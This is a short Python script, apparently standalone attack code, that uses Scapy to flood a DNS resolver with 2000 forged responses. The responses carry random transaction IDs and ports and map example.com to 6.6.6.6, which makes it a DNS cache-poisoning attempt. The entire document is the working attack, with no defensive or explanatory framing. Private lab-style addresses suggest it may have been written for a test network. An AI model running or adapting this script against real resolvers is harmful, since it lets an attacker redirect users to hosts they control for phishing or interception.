from scapy.all import *

resolver = "10.10.0.53"
target = "example.com"

print("[+] Sending spoof packets...")

for i in range(2000):
    pkt = IP(src="10.10.0.100", dst=resolver)/ \
          UDP(sport=53, dport=RandShort())/ \
          DNS(id=RandShort(), qr=1, aa=1,
              qd=DNSQR(qname=target),
              an=DNSRR(rrname=target, ttl=300, rdata="6.6.6.6"))

    send(pkt, verbose=0)

print("[+] Done")
